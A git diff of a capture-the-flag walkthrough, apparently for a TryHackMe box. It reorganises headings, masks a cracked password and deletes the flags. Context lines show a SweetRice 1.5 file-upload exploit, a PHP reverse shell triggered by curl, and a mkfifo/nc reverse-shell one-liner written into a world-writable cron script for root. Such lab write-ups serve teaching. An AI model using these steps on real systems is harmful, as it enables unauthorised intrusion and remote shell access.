@@ -8,13 +8,14 @@
 
 ## Enumeration
 
-- Nmap Initial
+### Nmap
 
 1. 22/ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 2. 80/http Apache httpd 2.4.18 ((Ubuntu))
    - apache2 ubuntu default page
 
-- check http
+### HTTP
+
 - directory brute forcing
 
 ```sh
@@ -83,11 +84,11 @@ js
 ```
 
 - crack the password may be md5
-- passwd -> 42f749ade7f9e195bf475f37a44cafcb:Password123:MD5PLAIN
+- passwd -> 42f749ade7f9e195bf475f37a44cafcb:xxxxxxxxxxx:MD5PLAIN
 
-- enter the `/content/as/` -> with `manager:Password123`
+- enter the `/content/as/` -> with `manager:xxxxxxxxxxxx`
 
-- from searchsploit found `arbitary file upload` for `sweetrice 1.5`
+- from searchsploit found `arbitary file upload` vuln is found for `sweetrice 1.5`
 - `searchsploit -m php/webapps/40716.py`
 - in that python file, we can upload reverse shell files via `r.post('http://' + host + '/as/?type=media_center&mode=upload', files=file)`
 
@@ -107,6 +108,8 @@ nc -vnlp 4242
 ```sh
 curl http://$IP/content/attachment/php_shell.phtml
 ```
+
+## User Access
 
 - shell with `www-data` user access will get
 - inside shell,
@@ -135,6 +138,9 @@ www-data@THM-Chal:/$ ls -la /etc/copy.sh
 2. backup.pl run `sh /etc/copy.sh`
 3. `/etc/copy.sh` has write access to anyone
 
+
+## Root Access
+
 - so, change the IP:PORT copy.sh file to our local machine IP:PORT that will listen with nc
 
 ```
@@ -147,10 +153,8 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.8.57 4444 >/tmp/f
 
 ```sh
 $ cat /home/itguy/user.txt
-THM{63e5bce9271952aad1113b6f1ac28a07}
 
 $ cat /root/root.txt
-THM{6637f41d0177b6f37cb20d775124699f}
 
 ```
 
